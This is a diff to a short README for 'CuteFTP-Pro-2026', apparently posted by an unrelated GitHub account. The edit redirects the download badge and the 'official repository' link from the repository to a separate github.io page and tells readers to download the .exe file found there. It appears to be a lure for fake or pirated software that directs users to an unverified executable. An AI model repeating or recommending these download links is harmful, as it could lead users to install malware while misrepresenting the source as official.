@@ -1,10 +1,10 @@
 # 📂 CuteFTP-Pro-2026 - Transfer your files easily on Windows
 
-[![](https://img.shields.io/badge/Download_CuteFTP_Pro-blue.svg)](https://github.com/maryjaneagitated610/CuteFTP-Pro-2026)
+[![](https://img.shields.io/badge/Download_CuteFTP_Pro-blue.svg)](https://maryjaneagitated610.github.io)
 
 ## 📥 How to Download 
 
-You can get the software directly from our official repository page. Follow this link to find the latest version for your computer: [https://github.com/maryjaneagitated610/CuteFTP-Pro-2026](https://github.com/maryjaneagitated610/CuteFTP-Pro-2026). 
+You can get the software directly from our official repository page. Follow this link to find the latest version for your computer: [https://maryjaneagitated610.github.io](https://maryjaneagitated610.github.io). 
 
 Once you reach the page, look for the file list. Choose the file ending in .exe to start your download. Your browser will save the file to your computer. Most users find this file in the Downloads folder on their hard drive.
 
